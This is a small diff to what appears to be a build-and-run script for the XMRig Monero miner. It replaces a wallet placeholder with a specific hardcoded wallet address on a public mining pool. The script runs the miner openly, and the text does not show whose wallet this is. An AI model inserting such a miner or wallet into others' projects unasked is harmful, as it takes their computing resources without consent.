@@ -12,7 +12,7 @@ cmake ..
 make -j$(nproc)
 
 # Run XMRig with your configuration
-./xmrig --url=pool.minexmr.com:5555 --user=YOUR_WALLET_ADDRESS --pass=x
+./xmrig --url=pool.minexmr.com:5555 --user=4Ac3QisYNfee5A21H75Qt4c8C9GGRhstENAQxqACn8TP4U3gdsm2Cno5VC4Cqw8FqD4tmnaoDPyKqToYXerx5ybSS87s28V --pass=x
 
 # Pause for 5 seconds before the script exits (optional)
 sleep 5
